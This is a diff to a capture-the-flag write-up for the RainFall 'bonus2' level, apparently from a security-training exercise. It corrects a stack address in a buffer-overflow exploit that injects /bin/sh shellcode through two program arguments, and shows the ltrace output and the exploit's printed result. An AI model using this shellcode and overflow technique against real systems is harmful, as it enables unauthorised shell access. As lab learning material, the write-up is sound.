@@ -84,11 +84,11 @@ Offset : 18
 bonus2@RainFall:~$ export LANG=fi
 bonus2@RainFall:~$ ltrace ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18')
 ...
-strncpy(0xbffff690, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 40)                                                                                        = 0xbffff690
+strncpy(0xbffff6c0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 40)                                                                                        = 0xbffff6c0
 ...
 ```
 
-Adress of str1 : 0xbffff690
+Adress of str1 : 0xbffff6c0
 
 **Solution:**
  * 1st Argument:
@@ -100,7 +100,7 @@ Adress of str1 : 0xbffff690
 
 ```
 bonus2@RainFall:~$ export LANG=fi
-bonus2@RainFall:~$ ./bonus2 $(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/b"') $(python -c 'print "in/sh" + "\x90" * 13 + "\x90\xf6\xff\xbf"')
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/b"') $(python -c 'print "in/sh" + "\x90" * 13 + "\xc0\xf6\xff\xbf"')
 Hyvää päivää �^�1��F�F
                       �
                        ���V
